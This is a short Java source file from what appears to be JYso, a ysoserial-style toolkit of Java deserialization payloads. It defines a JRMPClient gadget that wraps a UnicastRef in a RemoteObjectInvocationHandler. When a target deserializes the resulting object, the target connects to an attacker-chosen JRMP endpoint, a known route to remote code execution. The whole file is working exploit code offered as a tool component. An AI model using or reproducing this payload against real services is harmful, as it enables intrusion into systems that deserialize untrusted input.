package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.annotation.Authors;
import sun.rmi.server.UnicastRef;

import java.rmi.server.RemoteObjectInvocationHandler;

@SuppressWarnings({"unused"})
@Authors({"mbechler"})
public class JRMPClient_Obj implements ObjectPayload<RemoteObjectInvocationHandler> {
    @Override
    public RemoteObjectInvocationHandler getObject(String command) throws Exception {
        UnicastRef ref = JRMPClient_Activator.JRMPSource(command);
        return new RemoteObjectInvocationHandler(ref);
    }
}
